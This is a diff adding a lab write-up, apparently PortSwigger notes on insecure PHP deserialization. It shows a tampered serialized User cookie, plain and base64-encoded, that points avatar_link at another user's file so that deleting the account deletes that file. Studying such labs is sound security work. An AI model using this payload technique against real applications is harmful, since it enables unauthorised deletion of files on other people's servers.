@@ -341,7 +341,7 @@ You must be precise for unserialize to work.
 
 
 <details>
-  <summary>Lab: Modifying serialized objects</summary>
+  <summary>Lab: Modifying serialized objects `php 7.x` </summary>
 
 1. login as `wiener`
 2. intercept the request of `/my-account`
@@ -436,7 +436,43 @@ O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
 
 
 
+<details>
+     <summary>Lab: Using application functionality to exploit insecure deserialization</summary>
 
+
+1. login as `wiener`
+2. look at `cookie`
+
+
+<img width="1872" height="699" alt="image" src="https://github.com/user-attachments/assets/ddf98426-6e5d-4d03-a724-a6792a3c484b" />
+
+
+```
+O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e7wnsqdqe9j3kew3t81j1y6v04ljlb3x";s:11:"avatar_link";s:19:"users/wiener/avatar";}
+```
+
+3. wen want to delete **`/home/carlos/morale.txt`** we will :
+
+- change **`avatar_link`** To **`/home/carlos/morale.txt`**
+- after that delete the account
+
+```
+O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e7wnsqdqe9j3kew3t81j1y6v04ljlb3x";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+```
+
+```
+Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlN3duc3FkcWU5ajNrZXczdDgxajF5NnYwNGxqbGIzeCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
+```
+
+
+
+<img width="1797" height="703" alt="image" src="https://github.com/user-attachments/assets/5d70c367-abd9-4fb3-a67d-9d434d635ef5" />
+
+
+
+
+     
+</details>
 
 
 
